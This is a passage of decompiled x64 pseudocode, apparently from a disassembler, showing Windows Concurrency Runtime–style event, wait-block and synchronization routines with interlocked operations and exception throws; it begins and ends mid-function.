  __int64 (__fastcall *v2)(); // [rsp+30h] [rbp-28h]
  __int64 pExceptionObject[4]; // [rsp+38h] [rbp-20h] BYREF

  if ( (int)sub_13F1454C0() < 3 )
  {
    if ( _InterlockedCompareExchange(&dword_13F1C5DC0, 1, 0) )
    {
      v1 = 0;
      v2 = sub_13F142C6C;
    }
    else
    {
      qword_13F1C5DC8 = MEMORY[0x76FBC950]();
      _InterlockedExchange(&dword_13F1C5DC0, 0);
    }
    sub_13F109748(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  return 0i64;
}
// 13F14CC7F: write access to const memory at 13F1C5DC8 has been detected
// 13F14CCB5: conditional instruction was optimized away because ebx.4==1
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F1C5DC0: using guessed type int dword_13F1C5DC0;
// 13F1C5DC8: using guessed type __int64 qword_13F1C5DC8;
// 13F14CC50: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F14CD04) ----------------------------------------------------
__int64 __fastcall sub_13F14CD04(__int64 a1)
{
  __int64 v1; // rax
  signed __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 48);
  v2 = _InterlockedIncrement64((volatile signed __int64 *)(a1 + 72));
  result = v1 + 1;
  if ( v2 == result )
    return sub_13F14088C(a1, v2);
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14CD2C) ----------------------------------------------------
char __fastcall sub_13F14CD2C(__int64 a1)
{
  __int64 v1; // r9
  signed __int64 v2; // r8
  signed __int64 v3; // rax

  v1 = *(_QWORD *)(a1 + 56);
  v2 = *(_QWORD *)(a1 + 64);
  if ( v2 != v1 )
  {
    do
    {
      v3 = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 64), v2 - 1, v2);
      if ( v2 == v3 )
        break;
      v2 = v3;
    }
    while ( v3 != v1 );
    if ( v2 != v1 )
      return 1;
  }
  sub_13F14CD04(a1);
  return 0;
}

//----- (000000013F14CD6C) ----------------------------------------------------
char __fastcall sub_13F14CD6C(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // rcx

  if ( *(_DWORD *)(*(_QWORD *)(a3 + 8) + 16i64) == 2
    || _InterlockedCompareExchange((volatile signed __int32 *)(*(_QWORD *)(a3 + 8) + 16i64), 1, 0) == 2 )
  {
    v3 = *(_QWORD *)(a1 + 8);
    if ( a2 )
      *a2 = v3;
    else
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 24i64))(v3);
  }
  else if ( a2 )
  {
    *a2 = 0i64;
  }
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CDC0) ----------------------------------------------------
char __fastcall sub_13F14CDC0(__int64 a1, _QWORD *a2, __int64 a3)
{
  bool v6; // zf
  __int64 v7; // rax
  __int64 v8; // rcx

  if ( _InterlockedIncrement((volatile signed __int32 *)(a1 + 56)) != 1 )
    return 0;
  if ( !*(_BYTE *)(a1 + 48) )
    goto LABEL_8;
  if ( (int)sub_13F1454C0() < 3 )
  {
    v7 = sub_13F14CC50();
    sub_13F142350(v7, *(_QWORD *)(a1 + 40), -(__int64)(a3 != 0));
LABEL_8:
    v6 = a3 == 0;
    goto LABEL_9;
  }
  v6 = a3 == 0;
  if ( a3 )
  {
    if ( *(_QWORD *)(a1 + 40) )
      sub_13F14289C();
    goto LABEL_8;
  }
LABEL_9:
  v8 = *(_QWORD *)(a1 + 8);
  *(_BYTE *)(a1 + 60) = v6;
  if ( a2 )
    *a2 = v8;
  else
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v8 + 24i64))(v8);
  return 1;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CE74) ----------------------------------------------------
char __fastcall sub_13F14CE74(__int64 a1, _QWORD *a2)
{
  if ( a2 )
    *a2 = 0i64;
  if ( _InterlockedIncrement64((volatile signed __int64 *)(a1 + 64)) != *(_QWORD *)(a1 + 56) )
    return 1;
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  sub_13F14CD04(a1);
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CEC0) ----------------------------------------------------
char __fastcall sub_13F14CEC0(__int64 a1, _QWORD *a2)
{
  if ( a2 )
    *a2 = 0i64;
  if ( _InterlockedIncrement64((volatile signed __int64 *)(a1 + 64)) == *(_QWORD *)(a1 + 56) )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  sub_13F14CD04(a1);
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CF08) ----------------------------------------------------
signed __int64 __fastcall sub_13F14CF08(volatile signed __int64 *a1)
{
  unsigned __int64 v2; // rcx
  signed __int64 result; // rax
  unsigned __int64 v4; // rbx

  v2 = *a1;
  for ( result = _InterlockedCompareExchange64(a1, 1i64, v2);
        result != v2;
        result = _InterlockedCompareExchange64(a1, 1i64, result) )
  {
    v2 = result;
  }
  if ( v2 > 1 )
  {
    do
    {
      v4 = *(_QWORD *)v2;
      result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(v2 + 8) + 24i64))(*(_QWORD *)(v2 + 8));
      v2 = v4;
    }
    while ( v4 );
  }
  return result;
}
// 13F14CF39: conditional instruction was optimized away because rcx.8>=2u
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CF60) ----------------------------------------------------
__int64 __fastcall sub_13F14CF60(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v4; // rsi
  __int64 result; // rax
  bool v8; // zf
  int v9; // eax
  __int64 v10; // r14
  __int64 v11; // rax

  v4 = *(_QWORD *)(a1 + 8);
  if ( !*(_BYTE *)(a1 + 80)
    || (result = (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 40)), (_DWORD)result == 1) )
  {
    v8 = *(_QWORD *)(a1 + 32) == 0i64;
    *(_QWORD *)(a1 + 24) = a3;
    if ( !v8 )
    {
      v9 = sub_13F1454C0();
      v10 = *(_QWORD *)(a1 + 32);
      if ( v9 < 3 )
      {
        v11 = sub_13F14CC50();
        sub_13F142350(v11, v10, -1i64);
      }
      else
      {
        sub_13F14289C();
      }
      if ( *(_DWORD *)(a1 + 40) == 1 )
        sub_13F14CD04(a1);
    }
    result = *(_QWORD *)(a3 + 8);
    if ( *(_DWORD *)(result + 16) == 2
      || (result = (unsigned int)_InterlockedCompareExchange(
                                   (volatile signed __int32 *)(*(_QWORD *)(a3 + 8) + 16i64),
                                   1,
                                   0),
          (_DWORD)result == 2) )
    {
      if ( a2 )
        *a2 = v4;
      else
        return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
    }
    else if ( a2 )
    {
      *a2 = 0i64;
    }
  }
  return result;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D048) ----------------------------------------------------
__int64 *__fastcall sub_13F14D048(__int64 *a1, char a2)
{
  __int64 *v2; // rdi
  __int64 *v4; // rbx
  __int64 *v5; // rsi
  __int64 v6; // rax
  unsigned __int8 (*v7)(void); // rax

  v2 = 0i64;
  v4 = a1;
  if ( a1 )
  {
    do
    {
      v5 = (__int64 *)*v4;
      v6 = *(_QWORD *)v4[1];
      if ( a2 )
        v7 = *(unsigned __int8 (**)(void))(v6 + 24);
      else
        v7 = *(unsigned __int8 (**)(void))(v6 + 32);
      if ( v7() )
      {
        *v4 = (__int64)v2;
        v2 = v4;
      }
      v4 = v5;
    }
    while ( v5 );
  }
  return v2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D0B4) ----------------------------------------------------
char __fastcall sub_13F14D0B4(__int64 a1)
{
  void (*v1)(void); // rax

  if ( *(_QWORD *)(a1 + 64) >= *(_QWORD *)(a1 + 56) )
  {
    v1 = *(void (**)(void))(*(_QWORD *)a1 + 8i64);
LABEL_3:
    v1();
    return 0;
  }
  if ( *(_BYTE *)(a1 + 81) )
  {
    v1 = *(void (**)(void))(*(_QWORD *)a1 + 16i64);
    goto LABEL_3;
  }
  return 1;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D0F0) ----------------------------------------------------
char __fastcall sub_13F14D0F0(_BYTE *a1)
{
  if ( !a1[60] )
    return 1;
  (*(void (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 16i64))(a1);
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D114) ----------------------------------------------------
char __fastcall sub_13F14D114(_BYTE *a1)
{
  char v3; // [rsp+30h] [rbp+8h] BYREF

  if ( !a1[81] )
    return 1;
  if ( (**(unsigned __int8 (__fastcall ***)(_BYTE *, char *, _QWORD))a1)(a1, &v3, 0i64) )
    (*(void (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 16i64))(a1);
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D158) ----------------------------------------------------
char __fastcall sub_13F14D158(__int64 a1)
{
  char v2; // [rsp+30h] [rbp+8h] BYREF

  if ( *(_QWORD *)(a1 + 64) < *(_QWORD *)(a1 + 56) && !*(_BYTE *)(a1 + 81) )
    return 1;
  (**(void (__fastcall ***)(__int64, char *, _QWORD))a1)(a1, &v2, 0i64);
  return 0;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14D190) ----------------------------------------------------
bool __fastcall sub_13F14D190(__int64 a1, int a2)
{
  __int64 v4; // rax
  __int64 v6; // rax

  if ( !*(_BYTE *)(a1 + 48) )
    return 0;
  if ( (int)sub_13F1454C0() < 3 )
  {
    v6 = sub_13F14CC50();
    return (unsigned int)sub_13F142348(a1 + 40, v6, sub_13F14CC3C, a1, a2, 0, 32) == 1;
  }
  else
  {
    v4 = sub_13F142A78();
    *(_QWORD *)(a1 + 40) = v4;
    return v4 != 0;
  }
}
// 13F142348: using guessed type __int64 __fastcall sub_13F142348(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _DWORD);
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);

//----- (000000013F14D21C) ----------------------------------------------------
char __fastcall sub_13F14D21C(_QWORD *a1)
{
  __int64 v1; // rax
  _QWORD *v3; // rdi
  _QWORD *v4; // rbx
  __int64 v6[7]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v7; // [rsp+60h] [rbp+8h] BYREF

  v1 = *a1;
  if ( *a1 )
  {
    sub_13F141784(v6, (__int64)(a1 + 1));
    v3 = (_QWORD *)*a1;
    *a1 = 0i64;
    LOBYTE(v1) = sub_13F1417C8(v6);
    while ( v3 )
    {
      v7 = 0i64;
      v4 = v3 + 1;
      (**(void (__fastcall ***)(_QWORD, __int64 *, _QWORD *))v3[1])(v3[1], &v7, v3);
      v3 = (_QWORD *)*v3;
      LOBYTE(v1) = (*(__int64 (__fastcall **)(_QWORD))(*(_QWORD *)*v4 + 16i64))(*v4);
      if ( v7 )
        LOBYTE(v1) = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 24i64))(v7);
    }
  }
  return v1;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F14D21C: using guessed type __int64 var_38[7];

//----- (000000013F14D2B0) ----------------------------------------------------
char __fastcall sub_13F14D2B0(_QWORD *a1)
{
  __int64 v2; // rax
  _QWORD *v3; // rbx
  _QWORD *v4; // rsi
  __int64 v6[7]; // [rsp+28h] [rbp-40h] BYREF
  __int64 v7; // [rsp+70h] [rbp+8h] BYREF

  v2 = *a1;
  if ( *a1 )
  {
    sub_13F141784(v6, (__int64)(a1 + 1));
    v3 = (_QWORD *)*a1;
    v7 = 0i64;
    if ( !v3 )
      goto LABEL_7;
    do
    {
      v4 = v3 + 1;
      if ( (**(unsigned __int8 (__fastcall ***)(_QWORD, __int64 *, _QWORD *))v3[1])(v3[1], &v7, v3) )
        break;
      v3 = (_QWORD *)*v3;
      (*(void (__fastcall **)(_QWORD))(*(_QWORD *)*v4 + 16i64))(*v4);
    }
    while ( v3 );
    if ( v3 )
    {
      *a1 = *v3;
      (*(void (__fastcall **)(_QWORD))(*(_QWORD *)v3[1] + 16i64))(v3[1]);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 24i64))(v7);
    }
    else
    {
LABEL_7:
      *a1 = 0i64;
    }
    LOBYTE(v2) = sub_13F1417C8(v6);
  }
  return v2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F14D2B0: using guessed type __int64 var_40[7];

//----- (000000013F14D380) ----------------------------------------------------
char __fastcall sub_13F14D380(__int64 a1)
{
  __int64 *v2; // rbx
  __int64 v3; // rdi
  unsigned __int64 v4; // rsi
  __int64 v5; // rcx
  _QWORD *v6; // rax
  unsigned __int64 v7; // rcx
  __int64 v8; // rax
  void *v9; // rsp
  __int64 *v10; // rax
  __int64 v11; // r14
  unsigned __int64 v12; // r12
  char result; // al
  __int64 *v14; // rbx
  __int64 v15; // [rsp+0h] [rbp-20h] BYREF
  __int64 v16[2]; // [rsp+20h] [rbp+0h] BYREF
  __int64 *v17; // [rsp+30h] [rbp+10h]
  __int64 v18; // [rsp+38h] [rbp+18h]
  __int64 v19; // [rsp+40h] [rbp+20h]
  __int64 pExceptionObject[3]; // [rsp+48h] [rbp+28h] BYREF
  __int64 v21[6]; // [rsp+60h] [rbp+40h] BYREF

  v19 = -2i64;
  v2 = 0i64;
  v3 = 0i64;
  v16[1] = (__int64)&off_13F18AA60;
  v17 = 0i64;
  v18 = 0i64;
  sub_13F141784(v21, a1 + 16);
  v4 = _InterlockedExchange64((volatile __int64 *)a1, 1i64);
  if ( v4 <= 1 )
  {
    v11 = (__int64)v17;
    goto LABEL_23;
  }
  LODWORD(v5) = 0;
  v6 = (_QWORD *)v4;
  do
  {
    v5 = (unsigned int)(v5 + 1);
    v6 = (_QWORD *)*v6;
  }
  while ( v6 );
  v7 = (8 * v5 + 16) & -(__int64)(8 * v5 < (unsigned __int64)(8 * v5 + 16));
  if ( v7 )
  {
    if ( v7 > 0x400 )
    {
      v10 = (__int64 *)sub_13F16A298(v7);
      v2 = v10;
      if ( !v10 )
        goto LABEL_14;
      *(_DWORD *)v10 = 56797;
    }
    else
    {
      v8 = v7 + 15;
      if ( v7 + 15 <= v7 )
        v8 = 0xFFFFFFFFFFFFFF0i64;
      v9 = alloca(v8 & 0xFFFFFFFFFFFFFFF0ui64);
      v2 = v16;
      if ( &v15 == (__int64 *)-32i64 )
      {
LABEL_30:
        sub_13F109748(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
      LODWORD(v16[0]) = 52428;
    }
    v2 += 2;
  }
  else
  {
    v2 = 0i64;
  }
LABEL_14:
  if ( !v2 )
    goto LABEL_30;
  v11 = (__int64)v2;
  v17 = v2;
  v18 = 0i64;
  v3 = 0i64;
  do
  {
    v12 = *(_QWORD *)v4;
    if ( (***(unsigned __int8 (__fastcall ****)(_QWORD, __int64 *, unsigned __int64))(v4 + 8))(
           *(_QWORD *)(v4 + 8),
           v16,
           v4) )
    {
      *(_QWORD *)v4 = *(_QWORD *)(a1 + 8);
      *(_QWORD *)(a1 + 8) = v4;
    }
    if ( v16[0] )
    {
      v2[v3] = v16[0];
      v3 = (unsigned int)(v3 + 1);
    }
    v4 = v12;
  }
  while ( v12 );
LABEL_23:
  result = sub_13F1417C8(v21);
  if ( (_DWORD)v3 )
  {
    v14 = &v2[v3];
    do
    {
      --v14;
      result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)*v14 + 24i64))(*v14);
      LODWORD(v3) = v3 - 1;
    }
    while ( (_DWORD)v3 );
  }
  if ( v11 )
  {
    if ( *(_DWORD *)(v11 - 16) == 56797 )
      return sub_13F16A188(v11 - 16);
  }
  return result;
}
// 13F14D404: conditional instruction was optimized away because rsi.8>=2u
// 13F14D496: conditional instruction was optimized away because rsi.8>=2u
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18AA60: using guessed type __int64 (__fastcall *off_13F18AA60)();
// 13F14D380: using guessed type __int64 var_50[6];
// 13F14D380: using guessed type _QWORD pExceptionObject[3];

//----- (000000013F14D570) ----------------------------------------------------
signed __int64 __fastcall sub_13F14D570(__int64 **a1, __int64 a2)
{
  __int64 v5[7]; // [rsp+30h] [rbp-21h] BYREF
  __int64 v6[2]; // [rsp+68h] [rbp+17h] BYREF
  int v7; // [rsp+78h] [rbp+27h]
  __int64 v8[3]; // [rsp+80h] [rbp+2Fh] BYREF
  char v9; // [rsp+98h] [rbp+47h]
  int v10; // [rsp+9Ch] [rbp+4Bh]
  int v11; // [rsp+A0h] [rbp+4Fh]
  char v12; // [rsp+A4h] [rbp+53h]

  v7 = 0;
  v6[1] = (__int64)sub_13F142ED0();
  v6[0] = (__int64)off_13F18AA30;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v8[1] = (__int64)v6;
  sub_13F141784(v5, (__int64)(a1 + 1));
  v8[0] = (__int64)sub_13F14D048(*a1, 1);
  *a1 = v8;
  sub_13F141FB8(a2);
  sub_13F1417C8(v5);
  sub_13F142E90();
  return sub_13F141E5C(a2);
}
// 13F18AA30: using guessed type __int64 (__fastcall *off_13F18AA30[6])();
// 13F14D570: using guessed type __int64 var_78[7];

//----- (000000013F14D63C) ----------------------------------------------------
__int64 __fastcall sub_13F14D63C(__int64 **a1, unsigned int a2)
{
  char v4; // di
  __int64 v5[2]; // [rsp+28h] [rbp-29h] BYREF
  signed __int32 v6; // [rsp+38h] [rbp-19h] BYREF
  __int64 v7[3]; // [rsp+40h] [rbp-11h] BYREF
  _DWORD v8[4]; // [rsp+58h] [rbp+7h] BYREF
  __int64 (__fastcall *v9)(); // [rsp+68h] [rbp+17h]
  __int64 v10[7]; // [rsp+70h] [rbp+1Fh] BYREF
  __int64 **v11; // [rsp+C8h] [rbp+77h] BYREF

  v7[2] = -2i64;
  if ( a2 == -1 )
  {
    v8[2] = 0;
    v9 = sub_13F142C6C;
    while ( *a1 != (__int64 *)1 )
    {
      if ( !sub_13F141CA8(v8) )
      {
        v6 = 0;
        v5[1] = (__int64)sub_13F142ED0();
        v5[0] = (__int64)off_13F18A958;
        v7[1] = (__int64)v5;
        v4 = 0;
        sub_13F141784(v10, (__int64)(a1 + 2));
        if ( *a1 == (__int64 *)1 )
        {
          v4 = 1;
        }
        else
        {
          v7[0] = (__int64)sub_13F14D048(*a1, 1);
          *a1 = v7;
        }
        sub_13F1417C8(v10);
        if ( !v4 && v6 != 1 && _InterlockedCompareExchange(&v6, 2, 0) != 1 )
          sub_13F142E90();
        return 0i64;
      }
    }
    return 0i64;
  }
  else if ( a2 )
  {
    v11 = a1;
    return sub_13F14D8AC((__int64 *)&v11, 1ui64, 1, a2);
  }
  else
  {
    return -(__int64)(*a1 != (__int64 *)1);
  }
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F18A958: using guessed type __int64 (__fastcall *off_13F18A958[6])();
// 13F14D63C: using guessed type __int64 var_38[7];

//----- (000000013F14D768) ----------------------------------------------------
bool __fastcall sub_13F14D768(__int64 **a1, __int64 a2, int a3)
{
  __int64 v7; // rdi
  bool v8; // bl
  __int64 pExceptionObject[3]; // [rsp+28h] [rbp-60h] BYREF
  __int64 v10[6]; // [rsp+40h] [rbp-48h] BYREF

  if ( !a3 )
    return 0;
  if ( a3 == -1 )
  {
    sub_13F14D570(a1, a2);
    return 1;
  }
  else
  {
    v7 = sub_13F14059C(64i64);
    if ( v7 )
    {
      *(_QWORD *)v7 = &Concurrency::details::WaitBlock::`vftable';
      *(_QWORD *)(v7 + 8) = 0i64;
      *(_DWORD *)(v7 + 16) = 0;
      *(_QWORD *)(v7 + 8) = sub_13F142ED0();
      *(_QWORD *)v7 = off_13F18AA30;
      *(_QWORD *)(v7 + 32) = 0i64;
      *(_BYTE *)(v7 + 48) = 1;
      *(_DWORD *)(v7 + 52) = 0;
      *(_DWORD *)(v7 + 56) = 0;
      *(_BYTE *)(v7 + 60) = 0;
      *(_QWORD *)(v7 + 32) = v7;
    }
    else
    {
      v7 = 0i64;
    }
    sub_13F141784(v10, (__int64)(a1 + 1));
    *(_QWORD *)(v7 + 24) = sub_13F14D048(*a1, 1);
    *a1 = (__int64 *)(v7 + 24);
    if ( !sub_13F14D190(v7, a3) )
    {
      sub_13F109748(pExceptionObject);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_13F141FB8(a2);
    sub_13F1417C8(v10);
    sub_13F142E90();
    v8 = *(_BYTE *)(v7 + 60) == 0;
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 16i64))(v7);
    sub_13F141E5C(a2);
    return v8;
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18A928: using guessed type void *Concurrency::details::WaitBlock::`vftable';
// 13F18AA30: using guessed type __int64 (__fastcall *off_13F18AA30[6])();
// 13F14D768: using guessed type __int64 var_48[6];
// 13F14D768: using guessed type _QWORD pExceptionObject[3];

//----- (000000013F14D8AC) ----------------------------------------------------
__int64 __fastcall sub_13F14D8AC(__int64 *a1, unsigned __int64 a2, char a3, unsigned int a4)
{
  unsigned __int64 v6; // rbx
  __int64 **v9; // rcx
  unsigned __int64 i; // rax
  __int64 v11; // r8
  char v12; // r12
  unsigned __int64 v13; // r13
  __int64 *v14; // rsi
  __int64 **v15; // r15
  unsigned __int8 (__fastcall ***v16)(_QWORD, __int64 *, __int64 *); // rcx
  unsigned __int8 (__fastcall *v17)(_QWORD, __int64 *, __int64 *); // rax
  unsigned __int64 v18; // r13
  _QWORD *v19; // rsi
  unsigned __int64 v20; // rbx
  __int64 v21; // r14
  __int64 v22; // rbx
  __int64 v23; // rax
  unsigned __int64 v24; // rbx
  __int64 v25; // rax
  __int64 v26; // rax
  __int64 v27; // [rsp+48h] [rbp-C0h] BYREF
  unsigned __int64 v28; // [rsp+50h] [rbp-B8h]
  __int64 v29; // [rsp+60h] [rbp-A8h]
  __int64 v30; // [rsp+68h] [rbp-A0h]
  __int64 v31; // [rsp+70h] [rbp-98h]
  __int64 v32; // [rsp+80h] [rbp-88h]
  __int64 v33[3]; // [rsp+88h] [rbp-80h] BYREF
  __int64 v34[3]; // [rsp+A0h] [rbp-68h] BYREF
  __int64 v35[3]; // [rsp+B8h] [rbp-50h] BYREF
  __int64 v36[3]; // [rsp+D0h] [rbp-38h] BYREF
  __int64 pExceptionObject[3]; // [rsp+E8h] [rbp-20h] BYREF
  __int64 v38[13]; // [rsp+100h] [rbp-8h] BYREF
  __int64 v39; // [rsp+178h] [rbp+70h] BYREF
  char v40; // [rsp+188h] [rbp+80h]

  v40 = a3;
  v32 = -2i64;
  v6 = a2;
  if ( !a1 )
  {
    sub_13F1097A8(v33, (__int64)"pEvents");
    CxxThrowException(v33, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a2 )
    return 0i64;
  if ( a2 == 1 && ((a4 + 1) & 0xFFFFFFFE) == 0 )
  {
    v9 = (__int64 **)*a1;
    if ( !v9 )
    {
      sub_13F1097A8(v34, (__int64)"pEvents");
      CxxThrowException(v34, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
    return sub_13F14D63C(v9, a4);
  }
  for ( i = 0i64; i < a2; ++i )
  {
    if ( !a1[i] )
    {
      sub_13F1097A8(v35, (__int64)"pEvents");
      CxxThrowException(v35, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  v11 = a2;
  LOBYTE(a2) = a3;
  sub_13F14C80C(&v27, a2, v11, a4 != -1, a4 - 1 <= 0xFFFFFFFD);
  v12 = 0;
  v13 = 0i64;
  if ( !v6 )
    goto LABEL_29;
  v14 = (__int64 *)(v27 + v29);
  while ( 1 )
  {
    v15 = (__int64 **)a1[v13];
    sub_13F141784(v38, (__int64)(v15 + 2));
    ++v31;
    if ( *v15 == (__int64 *)1 )
      break;
    *v14 = (__int64)sub_13F14D048(*v15, 1);
    *v15 = v14;
LABEL_20:
    sub_13F1417C8(v38);
    ++v13;
    v14 = (__int64 *)((char *)v14 + v28);
    if ( v13 >= v6 )
      goto LABEL_28;
  }
  v16 = (unsigned __int8 (__fastcall ***)(_QWORD, __int64 *, __int64 *))v14[1];
  v17 = **v16;
  if ( v40 )
  {
    if ( v17(v16, &v39, v14) )
    {
      *v14 = (__int64)sub_13F14D048(v15[1], 0);
      v15[1] = v14;
    }
    if ( v39 )
      v12 = 1;
    goto LABEL_20;
  }
  v17(v16, &v39, v14);
  if ( v39 )
    v12 = 1;
  v18 = v13 + 1;
  if ( v18 < v6 )
  {
    v19 = (_QWORD *)(v29 + v18 * v28 + v27 + 8);
    v20 = v6 - v18;
    v21 = v31;
    do
    {
      v31 = ++v21;
      (**(void (__fastcall ***)(_QWORD, __int64 *, __int64))*v19)(*v19, &v39, (__int64)(v19 - 1));
      v19 = (_QWORD *)((char *)v19 + v28);
      --v20;
    }
    while ( v20 );
  }
  sub_13F1417C8(v38);
LABEL_28:
  if ( v12 )
    goto LABEL_35;
LABEL_29:
  if ( *(_DWORD *)(v30 + 16) == 1 || _InterlockedCompareExchange((volatile signed __int32 *)(v30 + 16), 2, 0) == 1 )
    goto LABEL_35;
  if ( a4 )
  {
    if ( a4 == -1 || *(_DWORD *)(v30 + 40) )
    {
      v22 = v30;
    }
    else
    {
      if ( (int)sub_13F1454C0() < 3 )
      {
        v26 = sub_13F14CC50();
        v22 = v30;
        if ( !(unsigned int)sub_13F142348(v30 + 32, v26, sub_13F14CBD4, v30, a4, 0, 32) )
        {
          sub_13F109748(pExceptionObject);
          CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
        }
      }
      else
      {
        v22 = v30;
        v25 = sub_13F142A78();
        *(_QWORD *)(v22 + 32) = v25;
        if ( !v25 )
        {
          sub_13F109748(v36);
          CxxThrowException(v36, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
        }
      }
      ++v31;
    }
    sub_13F142E90();
  }
  else
  {
    if ( _InterlockedIncrement((volatile signed __int32 *)(v30 + 40)) == 1 )
    {
      v22 = v30;
      *(_QWORD *)(v30 + 24) = 0i64;
      *(_BYTE *)(v22 + 81) = 1;
      goto LABEL_36;
    }
    sub_13F142E90();
LABEL_35:
    v22 = v30;
  }
LABEL_36:
  v23 = *(_QWORD *)(v22 + 24);
  if ( v23 )
    v24 = (v23 - v29 - v27) / v28;
  else
    v24 = -1i64;
  sub_13F14C968(&v27);
  return v24;
}
// 13F14D92A: conditional instruction was optimized away because rdx.8!=0
// 13F142348: using guessed type __int64 __fastcall sub_13F142348(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _DWORD);
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F14D8AC: using guessed type _QWORD var_B0[3];
// 13F14D8AC: using guessed type __int64 var_68[13];
// 13F14D8AC: using guessed type _QWORD pExceptionObject[3];
// 13F14D8AC: using guessed type _QWORD var_98[3];
// 13F14D8AC: using guessed type _QWORD var_E0[3];
// 13F14D8AC: using guessed type _QWORD var_C8[3];

//----- (000000013F14DC58) ----------------------------------------------------
__int64 __fastcall sub_13F14DC58(__int64 a1, __int64 a2, char a3)
{
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rdx

  *(_QWORD *)a1 = off_13F18ABC8;
  *(_QWORD *)(a1 + 36) = 0i64;
  *(_DWORD *)(a1 + 44) = 0;
  *(_QWORD *)(a1 + 56) = a2;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_DWORD *)(a1 + 80) = 1;
  *(_DWORD *)(a1 + 84) = 0;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_DWORD *)(a1 + 112) = -1;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_DWORD *)(a1 + 128) = 0;
  *(_BYTE *)(a1 + 136) = a3;
  *(_QWORD *)(a1 + 144) = 0i64;
  sub_13F141708((_DWORD *)(a1 + 152));
  *(_DWORD *)(a1 + 176) = 0;
  *(_DWORD *)(a1 + 180) = -1;
  *(_DWORD *)(a1 + 184) = -1;
  *(_DWORD *)(a1 + 188) = 0;
  *(_DWORD *)(a1 + 192) = 0;
  *(_DWORD *)(a1 + 196) = 0;
  *(_QWORD *)(a1 + 200) = 0i64;
  *(_QWORD *)(a1 + 208) = 7i64;
  v5 = sub_13F1790C4(56i64, v4);
